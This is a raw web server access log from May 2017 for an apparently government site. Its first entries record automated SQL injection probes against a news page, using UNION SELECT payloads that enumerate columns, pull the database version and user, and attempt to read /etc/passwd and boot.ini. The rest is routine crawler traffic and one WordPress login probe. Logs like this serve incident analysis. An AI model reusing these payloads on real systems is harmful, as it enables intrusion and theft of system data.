138.91.147.40 - - [29/May/2017:06:14:29 +0530] "POST /detail_news.php?id=999999.9+UnIoN+AlL+SeLeCt+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39,0x39313335313435363232362e39,0x39313335313435363232372e39,0x39313335313435363232382e39,0x39313335313435363232392e39,0x39313335313435363233302e39,0x39313335313435363233312e39,0x39313335313435363233322e39,0x39313335313435363233332e39,0x39313335313435363233342e39 HTTP/1.1" 200 18053 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9+UnIoN+AlL+SeLeCt+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39,0x39313335313435363232362e39,0x39313335313435363232372e39,0x39313335313435363232382e39,0x39313335313435363232392e39,0x39313335313435363233302e39,0x39313335313435363233312e39,0x39313335313435363233322e39,0x39313335313435363233332e39,0x39313335313435363233342e39" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
138.91.147.40 - - [29/May/2017:06:14:30 +0530] "POST /detail_news.php?id=999999.9+UnIoN+AlL+SeLeCt+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39,0x39313335313435363232362e39,0x39313335313435363232372e39,0x39313335313435363232382e39,0x39313335313435363232392e39,0x39313335313435363233302e39,0x39313335313435363233312e39,0x39313335313435363233322e39,0x39313335313435363233332e39,0x39313335313435363233342e39,0x39313335313435363233352e39 HTTP/1.1" 200 18053 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9+UnIoN+AlL+SeLeCt+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39,0x39313335313435363232362e39,0x39313335313435363232372e39,0x39313335313435363232382e39,0x39313335313435363232392e39,0x39313335313435363233302e39,0x39313335313435363233312e39,0x39313335313435363233322e39,0x39313335313435363233332e39,0x39313335313435363233342e39,0x39313335313435363233352e39" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
138.91.147.40 - - [29/May/2017:06:14:31 +0530] "POST /detail_news.php?id=999999.9'+UnIoN+AlL+SeLeCt+0x393133353134353632312e39+and+'0'='0 HTTP/1.1" 200 11640 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+UnIoN+AlL+SeLeCt+0x393133353134353632312e39+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
138.91.147.40 - - [29/May/2017:06:14:31 +0530] "POST /detail_news.php?id=999999.9'+UnIoN+AlL+SeLeCt+0x393133353134353632312e39,0x393133353134353632322e39+and+'0'='0 HTTP/1.1" 200 11640 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+UnIoN+AlL+SeLeCt+0x393133353134353632312e39,0x393133353134353632322e39+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
138.91.147.40 - - [29/May/2017:06:14:32 +0530] "POST /detail_news.php?id=999999.9'+UnIoN+AlL+SeLeCt+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39+and+'0'='0 HTTP/1.1" 200 11640 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+UnIoN+AlL+SeLeCt+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
138.91.147.40 - - [29/May/2017:06:14:33 +0530] "POST /detail_news.php?id=999999.9'+UnIoN+AlL+SeLeCt+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39+and+'0'='0 HTTP/1.1" 200 11640 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+UnIoN+AlL+SeLeCt+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
138.91.147.40 - - [29/May/2017:06:14:33 +0530] "POST /detail_news.php?id=999999.9'+UnIoN+AlL+SeLeCt+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39+and+'0'='0 HTTP/1.1" 200 18131 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+UnIoN+AlL+SeLeCt+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
138.91.147.40 - - [29/May/2017:06:14:34 +0530] "POST /detail_news.php?id=999999.9'+UnIoN+AlL+SeLeCt+1,2,CoNcAt(char(33,126,33),VeRsIoN(),char(33,126,33)),4,5+and+'0'='0 HTTP/1.1" 200 18131 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+UnIoN+AlL+SeLeCt+1,2,CoNcAt(char(33,126,33),VeRsIoN(),char(33,126,33)),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
138.91.147.40 - - [29/May/2017:06:14:35 +0530] "POST /detail_news.php?id=999999.9'+UnIoN+AlL+SeLeCt+1,2,CoNcAt(char(33,126,33),VeRsIoN(),char(33,126,33)),4,5+and+'0'='0 HTTP/1.1" 200 18131 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+UnIoN+AlL+SeLeCt+1,2,CoNcAt(char(33,126,33),VeRsIoN(),char(33,126,33)),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
138.91.147.40 - - [29/May/2017:06:14:36 +0530] "POST /detail_news.php?id=999999.9'+UnIoN+AlL+SeLeCt+1,2,CoNcAt(char(33,126,33),UsEr(),char(33,126,33)),4,5+and+'0'='0 HTTP/1.1" 200 18146 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+UnIoN+AlL+SeLeCt+1,2,CoNcAt(char(33,126,33),UsEr(),char(33,126,33)),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
138.91.147.40 - - [29/May/2017:06:14:36 +0530] "POST /detail_news.php?id=999999.9'+UnIoN+AlL+SeLeCt+1,2,CoNcAt(char(33,126,33),VeRsIoN(),char(33,126,33)),4,5+and+'0'='0 HTTP/1.1" 200 18131 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+UnIoN+AlL+SeLeCt+1,2,CoNcAt(char(33,126,33),VeRsIoN(),char(33,126,33)),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
138.91.147.40 - - [29/May/2017:06:14:37 +0530] "POST /detail_news.php?id=999999.9'+UnIoN+AlL+SeLeCt+1,2,CoNcAt(char(33,126,33),LoAd_fIlE(0x2f6574632f706173737764),char(33,126,33)),4,5+and+'0'='0 HTTP/1.1" 200 18119 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+UnIoN+AlL+SeLeCt+1,2,CoNcAt(char(33,126,33),LoAd_fIlE(0x2f6574632f706173737764),char(33,126,33)),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
138.91.147.40 - - [29/May/2017:06:14:38 +0530] "POST /detail_news.php?id=999999.9'+UnIoN+AlL+SeLeCt+1,2,CoNcAt(char(33,126,33),LoAd_fIlE(0x633a5c5c626f6f742e696e69),char(33,126,33)),4,5+and+'0'='0 HTTP/1.1" 200 18119 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+UnIoN+AlL+SeLeCt+1,2,CoNcAt(char(33,126,33),LoAd_fIlE(0x633a5c5c626f6f742e696e69),char(33,126,33)),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
138.91.147.40 - - [29/May/2017:06:14:39 +0530] "POST /detail_news.php?id=999999.9'+UnIoN+AlL+SeLeCt+1,2,CoNcAt(char(33,126,33),LoAd_fIlE(0x633a5c5c626f6f742e696e69),char(33,126,33)),4,5+and+'0'='0 HTTP/1.1" 200 18119 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+UnIoN+AlL+SeLeCt+1,2,CoNcAt(char(33,126,33),LoAd_fIlE(0x633a5c5c626f6f742e696e69),char(33,126,33)),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
66.249.79.133 - - [29/May/2017:06:18:00 +0530] "GET /project_details_view_report.php?id=820 HTTP/1.1" 200 13231 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.63 - - [29/May/2017:06:26:10 +0530] "GET /downloads/Template_sharing%202Percent.doc HTTP/1.1" 200 73728 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
202.46.54.199 - - [29/May/2017:06:28:08 +0530] "GET /project_details_view.php?id=361 HTTP/1.1" 200 14395 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
157.55.39.63 - - [29/May/2017:06:30:22 +0530] "GET /detail_events.php?id= HTTP/1.1" 302 16737 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.63 - - [29/May/2017:06:30:23 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.63 - - [29/May/2017:06:30:24 +0530] "GET /index.php HTTP/1.1" 200 19479 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.63 - - [29/May/2017:06:32:58 +0530] "GET /sitemap.php HTTP/1.1" 200 18468 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.133 - - [29/May/2017:06:35:28 +0530] "GET /uploads/969349347Report%20on%20Stakeholder%20Consultation_Jyoti%20Enviro%20Tech%20Pvt%20Ltd.pdf HTTP/1.1" 304 - "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
211.0.154.127 - - [29/May/2017:06:36:28 +0530] "GET / HTTP/1.1" 200 19479 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
180.76.15.153 - - [29/May/2017:06:46:20 +0530] "GET / HTTP/1.1" 200 19479 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
64.233.173.138 - - [29/May/2017:06:46:59 +0530] "GET /project_details_view_report.php?id=621 HTTP/1.1" 200 13176 "http://www.google.co.in/" "Mozilla/5.0 (Linux; Android 7.0; Moto G (5) Plus Build/NPN25.137-15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.138 - - [29/May/2017:06:46:59 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "http://www.cdmindia.gov.in/project_details_view_report.php?id=621" "Mozilla/5.0 (Linux; Android 7.0; Moto G (5) Plus Build/NPN25.137-15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.138 - - [29/May/2017:06:46:59 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://www.cdmindia.gov.in/project_details_view_report.php?id=621" "Mozilla/5.0 (Linux; Android 7.0; Moto G (5) Plus Build/NPN25.137-15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.136 - - [29/May/2017:06:46:59 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/project_details_view_report.php?id=621" "Mozilla/5.0 (Linux; Android 7.0; Moto G (5) Plus Build/NPN25.137-15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.137 - - [29/May/2017:06:46:59 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view_report.php?id=621" "Mozilla/5.0 (Linux; Android 7.0; Moto G (5) Plus Build/NPN25.137-15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.137 - - [29/May/2017:06:46:59 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://www.cdmindia.gov.in/project_details_view_report.php?id=621" "Mozilla/5.0 (Linux; Android 7.0; Moto G (5) Plus Build/NPN25.137-15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.136 - - [29/May/2017:06:46:59 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://www.cdmindia.gov.in/project_details_view_report.php?id=621" "Mozilla/5.0 (Linux; Android 7.0; Moto G (5) Plus Build/NPN25.137-15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.137 - - [29/May/2017:06:46:59 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "http://www.cdmindia.gov.in/project_details_view_report.php?id=621" "Mozilla/5.0 (Linux; Android 7.0; Moto G (5) Plus Build/NPN25.137-15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.138 - - [29/May/2017:06:46:59 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://www.cdmindia.gov.in/project_details_view_report.php?id=621" "Mozilla/5.0 (Linux; Android 7.0; Moto G (5) Plus Build/NPN25.137-15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.136 - - [29/May/2017:06:46:59 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/project_details_view_report.php?id=621" "Mozilla/5.0 (Linux; Android 7.0; Moto G (5) Plus Build/NPN25.137-15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.138 - - [29/May/2017:06:46:59 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view_report.php?id=621" "Mozilla/5.0 (Linux; Android 7.0; Moto G (5) Plus Build/NPN25.137-15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.138 - - [29/May/2017:06:46:59 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/project_details_view_report.php?id=621" "Mozilla/5.0 (Linux; Android 7.0; Moto G (5) Plus Build/NPN25.137-15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.136 - - [29/May/2017:06:47:00 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/project_details_view_report.php?id=621" "Mozilla/5.0 (Linux; Android 7.0; Moto G (5) Plus Build/NPN25.137-15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.137 - - [29/May/2017:06:47:00 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view_report.php?id=621" "Mozilla/5.0 (Linux; Android 7.0; Moto G (5) Plus Build/NPN25.137-15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.137 - - [29/May/2017:06:47:00 +0530] "GET /favicon.ico HTTP/1.1" 200 1189 "http://www.cdmindia.gov.in/project_details_view_report.php?id=621" "Mozilla/5.0 (Linux; Android 7.0; Moto G (5) Plus Build/NPN25.137-15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
157.55.39.63 - - [29/May/2017:06:47:09 +0530] "GET /imp_links.php HTTP/1.1" 200 17833 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
141.8.142.74 - - [29/May/2017:06:49:34 +0530] "GET / HTTP/1.1" 200 19479 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
46.229.164.99 - - [29/May/2017:06:49:43 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
66.249.79.131 - - [29/May/2017:06:50:22 +0530] "GET /project_details_view.php?id=1842 HTTP/1.1" 200 14393 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.63 - - [29/May/2017:06:50:54 +0530] "GET /project_details_view_report.php?id=1792 HTTP/1.1" 200 13215 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
52.202.221.29 - - [29/May/2017:06:51:01 +0530] "GET / HTTP/1.1" 200 19479 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring"
157.55.39.63 - - [29/May/2017:06:54:07 +0530] "GET /constitution.php HTTP/1.1" 200 23668 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
202.46.57.79 - - [29/May/2017:06:57:14 +0530] "GET /project_details_view_report.php?id=681 HTTP/1.1" 200 13313 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
157.55.39.130 - - [29/May/2017:06:57:55 +0530] "GET /downloads/Comparision%20of%20PCN_30.03.doc HTTP/1.1" 200 49664 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.129 - - [29/May/2017:07:00:43 +0530] "GET /project_details_view.php?id=1411&oid=1&page=28&reporttype=1 HTTP/1.1" 200 15898 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.129 - - [29/May/2017:07:00:46 +0530] "GET /project_details_view.php?id=1024&oid=&page=57&reporttype= HTTP/1.1" 200 14793 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.131 - - [29/May/2017:07:00:47 +0530] "GET /project_details_view.php?id=1024&oid=&page=57&reporttype= HTTP/1.1" 200 14793 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.130 - - [29/May/2017:07:02:46 +0530] "GET /downloads/New%20PCN.doc HTTP/1.1" 200 435200 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.227 - - [29/May/2017:07:09:13 +0530] "GET /contactus.php HTTP/1.1" 200 18291 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.99 - - [29/May/2017:07:10:14 +0530] "GET /detail_news.php?id=19 HTTP/1.1" 302 19081 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.99 - - [29/May/2017:07:10:15 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.99 - - [29/May/2017:07:10:17 +0530] "GET /index.php HTTP/1.1" 200 19479 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
64.233.173.136 - - [29/May/2017:07:10:44 +0530] "GET /project_details_view.php?id=396 HTTP/1.1" 200 14200 "android-app://com.google.android.googlequicksearchbox" "Mozilla/5.0 (Linux; Android 6.0; XT1572 Build/MPHS24.49-18-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.137 - - [29/May/2017:07:10:45 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "http://www.cdmindia.gov.in/project_details_view.php?id=396" "Mozilla/5.0 (Linux; Android 6.0; XT1572 Build/MPHS24.49-18-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.136 - - [29/May/2017:07:10:45 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://www.cdmindia.gov.in/project_details_view.php?id=396" "Mozilla/5.0 (Linux; Android 6.0; XT1572 Build/MPHS24.49-18-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.136 - - [29/May/2017:07:10:45 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://www.cdmindia.gov.in/project_details_view.php?id=396" "Mozilla/5.0 (Linux; Android 6.0; XT1572 Build/MPHS24.49-18-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.136 - - [29/May/2017:07:10:45 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/project_details_view.php?id=396" "Mozilla/5.0 (Linux; Android 6.0; XT1572 Build/MPHS24.49-18-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.136 - - [29/May/2017:07:10:45 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://www.cdmindia.gov.in/project_details_view.php?id=396" "Mozilla/5.0 (Linux; Android 6.0; XT1572 Build/MPHS24.49-18-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.136 - - [29/May/2017:07:10:45 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=396" "Mozilla/5.0 (Linux; Android 6.0; XT1572 Build/MPHS24.49-18-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.136 - - [29/May/2017:07:10:45 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://www.cdmindia.gov.in/project_details_view.php?id=396" "Mozilla/5.0 (Linux; Android 6.0; XT1572 Build/MPHS24.49-18-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.138 - - [29/May/2017:07:10:45 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "http://www.cdmindia.gov.in/project_details_view.php?id=396" "Mozilla/5.0 (Linux; Android 6.0; XT1572 Build/MPHS24.49-18-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.136 - - [29/May/2017:07:10:45 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/project_details_view.php?id=396" "Mozilla/5.0 (Linux; Android 6.0; XT1572 Build/MPHS24.49-18-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.137 - - [29/May/2017:07:10:45 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/project_details_view.php?id=396" "Mozilla/5.0 (Linux; Android 6.0; XT1572 Build/MPHS24.49-18-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.138 - - [29/May/2017:07:10:45 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=396" "Mozilla/5.0 (Linux; Android 6.0; XT1572 Build/MPHS24.49-18-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.138 - - [29/May/2017:07:10:45 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/project_details_view.php?id=396" "Mozilla/5.0 (Linux; Android 6.0; XT1572 Build/MPHS24.49-18-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.137 - - [29/May/2017:07:10:45 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view.php?id=396" "Mozilla/5.0 (Linux; Android 6.0; XT1572 Build/MPHS24.49-18-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.136 - - [29/May/2017:07:10:46 +0530] "GET /favicon.ico HTTP/1.1" 200 1189 "http://www.cdmindia.gov.in/project_details_view.php?id=396" "Mozilla/5.0 (Linux; Android 6.0; XT1572 Build/MPHS24.49-18-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
157.55.39.227 - - [29/May/2017:07:11:38 +0530] "GET /project_details_view_report.php?id=1193 HTTP/1.1" 200 13198 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
202.46.53.146 - - [29/May/2017:07:11:46 +0530] "GET /project_details_view_report.php?id=1155 HTTP/1.1" 200 13178 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
141.8.142.74 - - [29/May/2017:07:15:19 +0530] "GET /contactus.php HTTP/1.1" 200 18291 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
176.126.252.11 - - [29/May/2017:07:16:15 +0530] "GET /wp-login.php HTTP/1.1" 404 210 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28)"
157.55.39.227 - - [29/May/2017:07:21:23 +0530] "GET /registration.php HTTP/1.1" 302 28528 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.227 - - [29/May/2017:07:21:24 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
